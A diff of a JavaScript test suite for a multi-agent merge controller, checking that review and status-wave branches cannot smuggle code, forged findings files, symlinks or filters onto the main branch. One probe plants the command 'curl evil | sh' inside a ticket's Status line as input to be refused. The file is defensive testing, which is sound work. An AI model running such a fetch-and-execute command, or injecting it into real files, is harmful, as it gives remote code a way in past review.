@@ -56,10 +56,10 @@ test("classify and bindBranches: task branches get the commit, their review bran
   assert.equal(classify("origin/feature/x", "agents/").kind, "foreign");
   assert.equal(classify("origin/t5-review-2", "").kind, "process");
   const R2 = "d".repeat(40), R1 = "e".repeat(40);
-  const cov = (m) => new Map(Object.entries(m).map(([b, s]) => [b, { reviewSha: s }]));
+  const cov = (m) => new Map(Object.entries(m).map(([b, s]) => [b, { reviewSha: s, file: `docs/reviews/${b.replace(/^agents\//, "").replace(/-review-/, "-review-").toUpperCase().replace("-REVIEW-", "-review-")}.md` }]));
   const read = (key) => ({ t1: { state: "ok", head: A, covers: cov({ "agents/t1-review-2": R2 }) }, t2: { state: "ok", head: B, covers: cov({}) } })[key] ?? { state: "none" };
   const ok = bindBranches(["origin/agents/t1", "origin/agents/t1-review-2", "origin/agents/t2", "origin/status-wave-1"], { prefix: "agents/", read });
-  assert.deepEqual(ok.args, [`origin/agents/t1@${A}`, `origin/agents/t1-review-2~${A}:${R2}`, `origin/agents/t2@${B}`, "origin/status-wave-1"]);
+  assert.deepEqual(ok.args, [`origin/agents/t1@${A}`, `origin/agents/t1-review-2~${A}:${R2}=docs/reviews/T1-review-2.md`, `origin/agents/t2@${B}`, "origin/status-wave-1"]);
   const bad = bindBranches(["origin/agents/t1", "origin/agents/t9", "origin/agents/t9-review-1", "origin/other"], { prefix: "agents/", read });
   assert.equal(bad.args, undefined);
   assert.equal(bad.problems.length, 2 + 0, "t9 once (its review branch is judged with it), and the foreign branch");
@@ -67,18 +67,20 @@ test("classify and bindBranches: task branches get the commit, their review bran
   assert.doesNotMatch(bad.problems.join("\n"), /journal\.mjs/, "no unchecked way to record a head is recommended");
   assert.match(bad.problems.join("\n"), /origin\/other: not a branch under the prefix/);
   // a review branch with no task branch in the wave is judged by the record alone; one the record does not cover is refused
-  assert.equal(bindBranches(["origin/agents/t1-review-2"], { prefix: "agents/", read }).args[0], `origin/agents/t1-review-2~${A}:${R2}`);
+  assert.equal(bindBranches(["origin/agents/t1-review-2"], { prefix: "agents/", read }).args[0], `origin/agents/t1-review-2~${A}:${R2}=docs/reviews/T1-review-2.md`);
   assert.match(bindBranches(["origin/agents/t1-review-1"], { prefix: "agents/", read }).problems[0], /no passing review of t1 at .* recorded for this branch/);
   assert.match(bindBranches(["origin/agents/t9-review-1"], { prefix: "agents/", read }).problems[0], /no record/);
-  assert.equal(classify("origin/agents/t1-specreview", "agents/").kind, "task", "a spec review branch is nothing the wave binds: it needs a record, which reviewed.mjs never writes for it");
+  assert.equal(classify("origin/agents/t1-specreview", "agents/").kind, "specreview"); assert.match(bindBranches(["origin/agents/t1-specreview"], { prefix: "agents/", read }).problems[0], /not merged by a wave: its file reaches the main branch with the task branch/);
   assert.match(bindBranches(["origin/agents/t1"], { prefix: "agents/", read: () => ({ state: "failed", head: A }) }).problems[0], /says fail/);
   assert.match(bindBranches(["origin/agents/t1"], { prefix: "agents/", read: () => ({ state: "unreadable", why: "EISDIR" }) }).problems[0], /EISDIR/);
   assert.match(bindBranches(["origin/agents/t1", "origin/agents/t1"], { prefix: "agents/", read }).problems[0], /listed twice/);
 });
 
 // --- a project with a bare origin and the factory's hooks --------------------------------------
+const BASES = [];   // every throwaway project of this file is removed when the file ends
+process.on("exit", () => { for (const b of BASES) fs.rmSync(b, { recursive: true, force: true }); });
 function project(cfg = {}) {
-  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "af-rev-")));
+  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "af-rev-"))); BASES.push(base);
   const dir = path.join(base, "work"), bare = path.join(base, "origin.git");
   spawnSync("git", ["init", "-q", "--bare", "-b", "main", bare]);
   spawnSync("git", ["init", "-q", "-b", "main", dir]);
@@ -111,14 +113,17 @@ function project(cfg = {}) {
 }
 
 // integ-wave.sh with the tokens wave.mjs builds
+// The findings file a review branch carries, as mkspec names it: docs/reviews/<TASK>-review-<n>|review-final|architecture-conformance.md
+const findingsOf = (branch) => { const m = /^(?:.*\/)?([^/]+?)-(review-\d+|review-final|conformance)$/.exec(branch.replace(/^origin\//, "")); return `docs/reviews/${m[1].toUpperCase()}-${m[2] === "conformance" ? "architecture-conformance" : m[2]}.md`; };
 function script(p, tokens0, { env = {}, verify = "true" } = {}) {
-  // a review branch token written as origin/<b>~<task sha> gets the commit origin has for the branch now (what reviewed.mjs would have read)
-  const tokens = tokens0.map((t) => (/~[0-9a-f]{40}$/.test(t) ? `${t}:${p.tip(t.replace(/^origin\//, "").replace(/~.*$/, ""))}` : t));
+  // a review branch token written as origin/<b>~<task sha> gets the commit origin has for the branch now and its findings file (what reviewed.mjs would have recorded)
+  const tokens = tokens0.map((t) => { const name = t.replace(/^origin\//, "").replace(/~.*$/, ""); return /~[0-9a-f]{40}$/.test(t) ? `${t}:${p.tip(name)}=${findingsOf(name)}` : t; });
+  const waveTasks = tokens.filter((t) => /@[0-9a-f]{40}$/.test(t)).map((t) => t.replace(/@.*$/, "").replace(/^.*\//, "").toLowerCase()).join(" ");
   const integ = path.join(p.base, `coordinator-integration`);
   if (!fs.existsSync(integ)) p.git("worktree", "add", "-q", "-B", "integration", integ, "refs/remotes/origin/main");
   const ctl = fakeController(p.base, {});
   const out = spawnSync("bash", [path.join(ROOT, "controller/integ-wave.sh"), "W", "wave", ...tokens], { cwd: integ, encoding: "utf8",
-    env: { ...CLEAN_ENV, MAIN: "main", INSTALL_CMD: "", VERIFY_CMD: verify, E2E_CMD: "", ...ctl.env, TRAILER: "", WAVE_LOG_DIR: path.join(p.base, "logs"), ...env } });
+    env: { ...CLEAN_ENV, MAIN: "main", INSTALL_CMD: "", VERIFY_CMD: verify, E2E_CMD: "", ...ctl.env, TRAILER: "", WAVE_LOG_DIR: path.join(p.base, "logs"), WAVE_TASKS: waveTasks, ...env } });
   p.git("fetch", "-q", "origin");
   return out;
 }
@@ -166,7 +171,7 @@ test("a review branch that carries more than findings files is not merged, even 
   const sha = p.task("t1"); p.review("t1", sha);
   p.git("checkout", "-q", "agents/t1-review-1"); p.write("src/evil.js", "export const x = 1;\n"); p.commit("sneak"); p.git("push", "-q", "origin", "agents/t1-review-1"); p.git("checkout", "-q", "main");
   const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`]);
-  assert.notEqual(out.status, 0); assert.match(out.stdout, /agents\/t1-review-1: .*docs\/reviews\/ only, but it has: A src\/evil\.js/);
+  assert.notEqual(out.status, 0); assert.match(out.stdout, /agents\/t1-review-1: .*may add exactly its findings file.*A src\/evil\.js/);
   assert.equal(mainHas(p, "src/t1.js"), false);
 });
 
@@ -181,21 +186,28 @@ test("probe 3d of the PR #68 review: a deletion hidden behind a rename into docs
   assert.doesNotMatch(out.stdout, /PUSHED/); assert.equal(p.origin("show", "main:src/app.js"), "export const a = 1;", "the file is still on main");
 });
 
-test("a review branch may add or change findings files; a deletion, a mode change or a symlink inside docs/reviews stops the wave", () => {
+test("a review branch may carry exactly its own findings file: a second findings file, another task's, a .gitattributes, a deletion, a mode change or a symlink stop the wave (probes 2-f, 2-g, 2-j)", () => {
   const cases = {
-    "an added file": [() => {}, true],
-    "a deleted findings file of an earlier round": [(p) => { p.git("rm", "-q", "docs/reviews/OLD.md"); }, false],
-    "a mode change": [(p) => { fs.chmodSync(path.join(p.dir, "docs/reviews/T1-review-1.md"), 0o755); }, false],
-    "a symlink": [(p) => { fs.symlinkSync("../../src/app.js", path.join(p.dir, "docs/reviews/link.md")); }, false],
+    "as recorded, nothing else": [() => {}, true],
+    "a second findings file for another commit": [(p) => p.write("docs/reviews/T1-second.md", `Verdict: pass\nReviewed commit: ${A}\n`), false],
+    "a findings file of another task": [(p) => p.write("docs/reviews/T9-review-1.md", "Verdict: pass\n"), false],
+    "a .gitattributes under docs/reviews": [(p) => p.write("docs/reviews/.gitattributes", "* filter=x\n"), false],
+    "a deleted findings file of an earlier round": [(p) => p.git("rm", "-q", "docs/reviews/OLD.md"), false],
+    "a mode change of its own file": [(p) => fs.chmodSync(path.join(p.dir, "docs/reviews/T1-review-1.md"), 0o755), false],
+    "a symlink": [(p) => fs.symlinkSync("../../src/app.js", path.join(p.dir, "docs/reviews/link.md")), false],
   };
   for (const [name, [change, ok]] of Object.entries(cases)) {
     const p = project(); p.write("docs/reviews/OLD.md", "old\n"); p.commit("old"); p.git(...NOHOOKS, "push", "-q", "origin", "main");
     const sha = p.task("t1"); p.review("t1", sha);
-    p.git("checkout", "-q", "agents/t1-review-1"); change(p); if (name !== "a mode change") p.write("docs/reviews/more.md", "more\n"); p.commit("change"); p.git("push", "-q", "origin", "agents/t1-review-1"); p.git("checkout", "-q", "main");
+    p.git("checkout", "-q", "agents/t1-review-1"); change(p); if (!name.startsWith("as recorded")) { p.commit("change"); p.git("push", "-q", "origin", "agents/t1-review-1"); } p.git("checkout", "-q", "main");
     const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`]);
     assert.equal(out.status === 0, ok, `${name}: ${out.stdout}`);
-    if (!ok) assert.match(out.stdout, /WAVE-STOPPED/);
+    if (!ok) { assert.match(out.stdout, /WAVE-STOPPED/); assert.match(out.stdout, /may add exactly its findings file/); }
   }
+  // the findings file must name the task's reviewed commit on its only Reviewed commit line
+  const q = project(); const s = q.task("t1"); q.review("t1", s);
+  q.git("checkout", "-q", "agents/t1-review-1"); q.write("docs/reviews/T1-review-1.md", `Verdict: pass\nReviewed commit: ${A}\n`); q.commit("other commit"); q.git("push", "-q", "origin", "agents/t1-review-1"); q.git("checkout", "-q", "main");
+  assert.match(script(q, [`origin/agents/t1@${s}`, `origin/agents/t1-review-1~${s}`]).stdout, /Reviewed commit line is not/);
 });
 
 test("a review branch pushed to after reviewed.mjs read it is not merged: the wave binds it to the commit that was read", () => {
@@ -281,41 +293,55 @@ function statusProject() {
   return { p, status };
 }
 
-test("a status-wave branch may change Status: lines of ticket files and nothing else; it is merged then", () => {
+const ticket = (status, extra = "") => `# T1: x\n\nStatus: ${status}\nDepends on: nothing\n${extra}\n## Goal\nx\n`;
+test("a status-wave branch sets Status: integrated on tickets of this wave, one line each, and is merged then", () => {
   const { p, status } = statusProject();
-  const sha = p.task("t1"); p.review("t1", sha);
-  status("status-wave-1", () => { p.write("docs/tasks/T1-x.md", "# T1: x\n\nStatus: integrated\nDepends on: nothing\n\n## Goal\nx\n"); p.write("docs/tasks/T2-y.md", "# T2: y\n\nStatus: integrated\n\n## Goal\ny\n"); });
-  const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`, "origin/status-wave-1"]);
+  const sha = p.task("t1"); p.review("t1", sha); const s2 = p.task("t2"); p.review("t2", s2);
+  status("status-wave-1", () => { p.write("docs/tasks/T1-x.md", ticket("integrated")); p.write("docs/tasks/T2-y.md", "# T2: y\n\nStatus: integrated\n\n## Goal\ny\n"); });
+  const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`, `origin/agents/t2@${s2}`, `origin/agents/t2-review-1~${s2}`, "origin/status-wave-1"]);
   assert.equal(out.status, 0, out.stdout + out.stderr); assert.match(out.stdout, /merged origin\/status-wave-1 at /);
   assert.match(p.origin("show", "main:docs/tasks/T1-x.md"), /Status: integrated/);
 });
 
 test("probe 6 of the PR #68 review: code and a forged findings file on a status-wave branch are not merged", () => {
-  const { p, status } = statusProject();
+  const { p } = statusProject();
   const sha = p.task("t1"); p.review("t1", sha);
   p.git("checkout", "-q", "-b", "status-wave-1", "main"); p.write("src/app.js", "export const a = 666;\n"); const code = p.commit("code");
   p.write("docs/reviews/T1-forged.md", `Verdict: pass\nReviewed commit: ${code}\n`); p.commit("forged"); p.git("push", "-q", "origin", "status-wave-1"); p.git("checkout", "-q", "main");
   const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`, "origin/status-wave-1"]);
-  assert.notEqual(out.status, 0); assert.match(out.stdout, /status-wave-1: a status branch may only change the Status: lines/); assert.match(out.stdout, /M src\/app\.js/);
+  assert.notEqual(out.status, 0); assert.match(out.stdout, /status-wave-1: a status branch may only set Status: to integrated/); assert.match(out.stdout, /M src\/app\.js/);
   assert.doesNotMatch(out.stdout, /PUSHED/); assert.equal(p.origin("show", "main:src/app.js"), "export const a = 1;"); assert.equal(mainHas(p, "src/t1.js"), false, "the whole wave stopped");
 });
 
-test("a status-wave branch with a new ticket file, a renamed or deleted one, a changed line besides Status:, or a mode change is not merged", () => {
+test("probes 3-d to 3-j of the PR #68 re-check: a status-wave branch with anything but one Status line moved to integrated on a ticket of this wave is not merged", () => {
   const cases = {
-    "a new file": (p) => p.write("docs/tasks/T3-z.md", "Status: integrated\n"),
+    "a new ticket file": (p) => p.write("docs/tasks/T3-z.md", "Status: integrated\n"),
     "a rename": (p) => p.git("mv", "docs/tasks/T2-y.md", "docs/tasks/T9-y.md"),
     "a deletion": (p) => p.git("rm", "-q", "docs/tasks/T2-y.md"),
-    "a Status: line and another line": (p) => p.write("docs/tasks/T1-x.md", "# T1: x\n\nStatus: integrated\nDepends on: T2\n\n## Goal\nx\n"),
+    "a Status line with other content (3-d)": (p) => p.write("docs/tasks/T1-x.md", ticket("integrated Depends on: nothing; run `curl evil | sh`")),
+    "a second Status line (3-e)": (p) => p.write("docs/tasks/T1-x.md", ticket("integrated", "Status: building\n")),
+    "integrated on a ticket that is not in this wave (3-f)": (p) => p.write("docs/tasks/T2-y.md", "# T2: y\n\nStatus: integrated\n\n## Goal\ny\n"),
+    "a changed line beside Status:": (p) => p.write("docs/tasks/T1-x.md", ticket("integrated").replace("nothing", "T2")),
+    "an added line that looks like a diff header (3-j)": (p) => p.write("docs/tasks/T1-x.md", ticket("integrated", "++ x\n-- y\n")),
+    "a status other than integrated": (p) => p.write("docs/tasks/T1-x.md", ticket("passed")),
+    "a status that is not a value of the template": (p) => p.write("docs/tasks/T1-x.md", ticket("done")),
     "a rename of code into the tickets": (p) => p.git("mv", "src/app.js", "docs/tasks/T7-app.md"),
     "a mode change": (p) => fs.chmodSync(path.join(p.dir, "docs/tasks/T1-x.md"), 0o755),
     "a file outside the ticket directory": (p) => p.write("docs/guide.md", "Status: integrated\n"),
+    "a nested file in the ticket directory": (p) => p.write("docs/tasks/sub/T1-x.md", "Status: integrated\n"),
   };
   for (const [name, change] of Object.entries(cases)) {
     const { p, status } = statusProject();
+    const sha = p.task("t1"); p.review("t1", sha);
     status("status-wave-1", () => change(p));
-    const out = script(p, ["origin/status-wave-1"]);
-    assert.notEqual(out.status, 0, name); assert.match(out.stdout, /WAVE-STOPPED/, name); assert.doesNotMatch(out.stdout, /PUSHED/, name);
+    const out = script(p, [`origin/agents/t1@${sha}`, `origin/agents/t1-review-1~${sha}`, "origin/status-wave-1"]);
+    assert.notEqual(out.status, 0, name); assert.match(out.stdout, /status-wave-1: a status branch may only set Status: to integrated/, name); assert.doesNotMatch(out.stdout, /PUSHED/, name);
+    assert.equal(mainHas(p, "src/t1.js"), false, `${name}: the whole wave stopped`);
   }
+  // the control: the same branch with exactly one Status line moved on a ticket of the wave passes (above); a wave with no task of that ticket stops
+  const { p, status } = statusProject(); status("status-wave-1", () => p.write("docs/tasks/T1-x.md", ticket("integrated")));
+  assert.notEqual(script(p, ["origin/status-wave-1"]).status, 0, "no task in the wave: no ticket may change");
+  assert.equal(script(p, ["origin/status-wave-1"], { env: { WAVE_TASKS: "t1" } }).status, 0, "T1 in the wave: the same branch passes");
 });
 
 test("a branch that is neither bound nor a status-wave branch stops the script: the probe-1 control, the tip of a plain task branch, is not merged", () => {
@@ -346,20 +372,22 @@ function bundle(p, { journalText = "", runner = "terminal", hosts, extra = {} } 
   fs.writeFileSync(path.join(ctl, "gate"), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
   const integ = path.join(ws, name, "coordinator-integration");
   fs.mkdirSync(path.dirname(integ), { recursive: true });
-  p.git("worktree", "add", "-q", "-B", "integration", integ, "refs/remotes/origin/main");
+  p.git("worktree", "add", "-q", "--detach", integ, "refs/remotes/origin/main");
   fs.writeFileSync(path.join(ctl, "factory.config.json"), JSON.stringify({ project: { name, mainBranch: "main", branchPrefix: "agents/" }, agents: { runner }, commands: { verify: "true" },
     hosts: { controller: { host: "local", controllerDir: ctl, projectDir: p.dir }, workers: hosts ?? [{ name: "local", kind: "local", projectDir: p.dir, workspacesDir: ws }] }, ...extra }));
   if (journalText) fs.writeFileSync(path.join(ctl, "journal.ndjson"), journalText);
   const bin = path.join(p.base, "bin"); fs.mkdirSync(bin, { recursive: true });
-  const run = (script, args, env = {}) => spawnSync("node", [path.join(ctl, script), ...args], { cwd: ctl, encoding: "utf8", timeout: 60000, env: { ...CLEAN_ENV, HOME: p.base, PATH: `${bin}${path.delimiter}${process.env.PATH}`, ...env } });
+  const raw = (script, args, env = {}) => spawnSync("node", [path.join(ctl, script), ...args], { cwd: ctl, encoding: "utf8", timeout: 60000, env: { ...CLEAN_ENV, HOME: p.base, PATH: `${bin}${path.delimiter}${process.env.PATH}`, ...env } });
+  // reviewed.mjs needs the review sha the reviewer reported: a test that says nothing about it reports the one origin has
+  const run = (script, args, env = {}) => raw(script, script === "reviewed.mjs" && args[0] !== "--architect" && args.length === 2 ? [...args, p.tip(args[1].replace(/^origin\//, ""))] : args, env);
   const events = () => (fs.existsSync(path.join(ctl, "journal.ndjson")) ? fs.readFileSync(path.join(ctl, "journal.ndjson"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)) : []);
   const waitEnd = () => { const log = path.join(ctl, "logs/wave.log"); for (let i = 0; i < 300; i++) { const t = fs.existsSync(log) ? fs.readFileSync(log, "utf8") : ""; if (/\nWAVE-END\s*$/.test(t) || /^WAVE-END/m.test(t.replace(/echo WAVE-END/g, ""))) return t; spawnSync("sleep", ["0.2"]); } throw new Error("the wave did not end"); };
   const cleanup = () => { for (const f of [`/tmp/${name}-integ-wave.sh`, `/tmp/${name}-wave.out`]) fs.rmSync(f, { force: true }); fs.rmSync(`/tmp/${name}-wave`, { recursive: true, force: true }); };
-  return { name, ctl, integ, run, events, waitEnd, bin, cleanup };
+  return { name, ctl, integ, run, raw, events, waitEnd, bin, cleanup };
 }
 const rec = (task, head, extra = {}) => line({ type: "review", task, verdict: "pass", path: "tester", head, by: "reviewed.mjs", ...extra });
 // the record reviewed.mjs writes for a review branch it read (what the wave binds the branch to)
-const recBranch = (p, task, head, branch, extra = {}) => rec(task, head, { branch, reviewSha: p.tip(branch), ...extra });
+const recBranch = (p, task, head, branch, extra = {}) => rec(task, head, { branch, reviewSha: p.tip(branch), file: findingsOf(branch), ...extra });
 
 test("wave.mjs launches the wave with the journal's commits; the wave merges exactly them", () => {
   const p = project(); const sha = p.task("t1"); p.review("t1", sha);
@@ -610,4 +638,70 @@ test("legitimate flows stay green: a level 2 task with its conformance branch, a
   const log = b.waitEnd(); assert.match(log, /PUSHED main/); assert.match(log, new RegExp(`merged origin/agents/t1-conformance at `));
   p.git("fetch", "-q", "origin"); assert.ok(mainHas(p, "src/t1.js") && mainHas(p, "src/t2.js"));
   b.cleanup();
+});
+
+// --- the re-check of PR #68 at 3f97a92 ---------------------------------------------------------
+const KINDS = { TP: ["tester", "pass"], TF: ["tester", "fail"], FP: ["final", "pass"], FF: ["final", "fail"], CP: ["conformance", "pass"], CF: ["conformance", "fail"], DP: ["docs-only", "docs-only"], AP: ["architect", "pass"] };
+const seq = (...names) => journal(...names.map((n) => ({ type: "review", task: "T1", head: A, path: KINDS[n][0], verdict: KINDS[n][1] })));
+
+test("which event may supersede which: every ordered pair of review events on one commit (the re-evaluation of PR #53 included)", () => {
+  // the rule: only a LATER passing final undoes a failed Tester round of the same commit; nothing undoes a failed final or a failed conformance review
+  const expected = (x, y) => {
+    let standing = [x, y].filter((n) => KINDS[n][1] === "fail");
+    if (y === "FP") standing = standing.filter((n) => n !== "TF" || x !== "TF");   // FP is the later event, so it removes the earlier TF
+    const primary = [x, y].filter((n) => KINDS[n][0] !== "conformance");
+    if (standing.length) return "failed";
+    return primary.length && KINDS[primary.at(-1)][1] !== "fail" ? "ok" : "none";
+  };
+  for (const x of Object.keys(KINDS)) for (const y of Object.keys(KINDS)) assert.equal(latestReview(seq(x, y), "t1").state, expected(x, y), `${x} then ${y}`);
+  // the cases that matter, spelled out
+  assert.equal(latestReview(seq("TF", "FP"), "t1").state, "ok", "the re-evaluation passes the commit the last round failed");
+  assert.equal(latestReview(seq("TF", "TP"), "t1").state, "failed", "a second Tester verdict does not undo a Tester fail");
+  assert.equal(latestReview(seq("FP", "TF"), "t1").state, "failed", "a fail after the pass is the latest verdict");
+  assert.equal(latestReview(seq("TF", "FP", "TF"), "t1").state, "failed", "a later Tester fail is not undone by the earlier re-evaluation");
+  assert.equal(latestReview(seq("FF", "FP"), "t1").state, "failed", "a failed re-evaluation is final");
+  assert.equal(latestReview(seq("CF", "FP"), "t1").state, "failed", "a failed conformance review is final, the re-evaluation does not undo it");
+  assert.equal(latestReview(seq("TF", "TF", "FP"), "t1").state, "ok", "every failed Tester round of the commit is undone by it");
+  assert.equal(latestReview(seq("TF", "FP", "CF"), "t1").state, "failed");
+});
+
+test("probe 10 of the PR #68 re-check: round 1 fails, rework, round 2 fails, the re-evaluation passes the commit round 2 failed: the wave takes it", () => {
+  const p = project();
+  const c1 = p.task("t1"); p.review("t1", c1, { round: 1, verdict: "fail" });
+  const c2 = p.push("t1", { "src/t1.js": "export const t1 = 2;\n" }, "rework"); p.review("t1", c2, { round: 2, verdict: "fail" });
+  p.git("checkout", "-q", "-b", "agents/t1-review-final", c2); p.write("docs/reviews/T1-review-final.md", `Verdict: pass\nReviewed commit: ${c2}\n`); p.commit("final"); p.git("push", "-q", "origin", "agents/t1-review-final"); p.git("checkout", "-q", "main");
+  const b = bundle(p);
+  try {
+    for (const br of ["agents/t1-review-1", "agents/t1-review-2"]) assert.equal(b.run("reviewed.mjs", ["T1", br]).status, 0);
+    assert.equal(b.run("wave.mjs", ["T", "S", "origin/agents/t1", "origin/agents/t1-review-final"]).status, 1, "before the re-evaluation: the last round failed");
+    assert.equal(b.run("reviewed.mjs", ["T1", "agents/t1-review-final"]).status, 0);
+    const r = b.run("wave.mjs", ["T", "S", "origin/agents/t1", "origin/agents/t1-review-final"]);
+    assert.equal(r.status, 0, r.stderr); const log = b.waitEnd();
+    assert.match(log, new RegExp(`merged origin/agents/t1 at ${c2}`)); assert.match(log, /PUSHED main/);
+    // a later failed re-evaluation of another commit, or the conformance review failing it, stops the wave again
+    p.git("fetch", "-q", "origin");
+  } finally { b.cleanup(); }
+});
+
+test("the review sha is required: without it nothing is recorded, and the message names the one-time path for reviews that predate it", () => {
+  const p = project(); const sha = p.task("t1"); p.review("t1", sha);
+  const b = bundle(p);
+  let r = b.raw("reviewed.mjs", ["T1", "agents/t1-review-1"]);
+  assert.equal(r.status, 3, r.stdout); assert.match(r.stdout, /no review SHA given/); assert.match(r.stdout, /written before this check reported none: it cannot be recorded, and it is not accepted without one/); assert.match(r.stdout, /Send the task back to review/);
+  assert.equal(b.events().length, 0, "nothing recorded");
+  for (const bad of ["abc", "z".repeat(40)]) assert.equal(b.raw("reviewed.mjs", ["T1", "agents/t1-review-1", bad]).status, 3, bad);
+  // the conformance and re-evaluation branches need it too
+  p.git("checkout", "-q", "-b", "agents/t1-conformance", sha); p.write("docs/reviews/T1-architecture-conformance.md", `Verdict: pass\nReviewed commit: ${sha}\n`); p.commit("conf"); p.git("push", "-q", "origin", "agents/t1-conformance"); p.git("checkout", "-q", "main");
+  assert.equal(b.raw("reviewed.mjs", ["T1", "agents/t1-conformance"]).status, 3);
+  assert.equal(b.raw("reviewed.mjs", ["T1", "agents/t1-review-1", p.tip("agents/t1-review-1")]).status, 0);
+  // the wave's message for a task with no record says the same, without recommending an unchecked way
+  const q = project(); const qs = q.task("t1"); q.review("t1", qs); const c = bundle(q); const w = c.run("wave.mjs", ["T", "S", "origin/agents/t1", "origin/agents/t1-review-1"]);
+  assert.equal(w.status, 1); assert.match(w.stderr, /older than this check \(one-time\)/); assert.match(w.stderr, /reviewed\.mjs <task> origin\/agents\/t1-review-<n> <review-sha>/); assert.doesNotMatch(w.stderr, /journal\.mjs/);
+  [b, c].forEach((x) => x.cleanup());
+});
+
+test("a -specreview branch in a wave gets the right message: leave it out", () => {
+  const read = () => ({ state: "ok", head: A, covers: new Map() });
+  const r = bindBranches(["origin/agents/t1", "origin/agents/t1-specreview"], { prefix: "agents/", read });
+  assert.equal(r.problems.length, 1); assert.match(r.problems[0], /spec review branch is not merged by a wave.*Leave this branch out/);
 });
